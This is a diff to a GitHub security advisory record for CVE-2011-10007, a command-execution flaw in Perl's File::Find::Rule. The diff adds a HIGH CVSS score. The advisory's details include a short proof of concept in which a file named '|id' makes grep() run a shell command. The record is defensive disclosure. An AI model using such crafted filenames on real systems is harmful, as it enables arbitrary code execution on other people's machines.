@@ -1,13 +1,18 @@
 {
   "schema_version": "1.4.0",
   "id": "GHSA-cvg9-q978-4569",
-  "modified": "2025-06-05T12:31:09Z",
+  "modified": "2025-06-05T15:31:32Z",
   "published": "2025-06-05T12:31:09Z",
   "aliases": [
     "CVE-2011-10007"
   ],
   "details": "File::Find::Rule through 0.34 for Perl is vulnerable to Arbitrary Code Execution when `grep()` encounters a crafted filename.\n\nA file handle is opened with the 2 argument form of `open()` allowing an attacker controlled filename to provide the MODE parameter to `open()`, turning the filename into a command to be executed.\n\nExample:\n\n$ mkdir /tmp/poc; echo > \"/tmp/poc/|id\"\n$ perl -MFile::Find::Rule \\\n    -E 'File::Find::Rule->grep(\"foo\")->in(\"/tmp/poc\")'\nuid=1000(user) gid=1000(user) groups=1000(user),100(users)",
-  "severity": [],
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+    }
+  ],
   "affected": [],
   "references": [
     {
@@ -35,7 +40,7 @@
     "cwe_ids": [
       "CWE-78"
     ],
-    "severity": null,
+    "severity": "HIGH",
     "github_reviewed": false,
     "github_reviewed_at": null,
     "nvd_published_at": "2025-06-05T12:15:22Z"
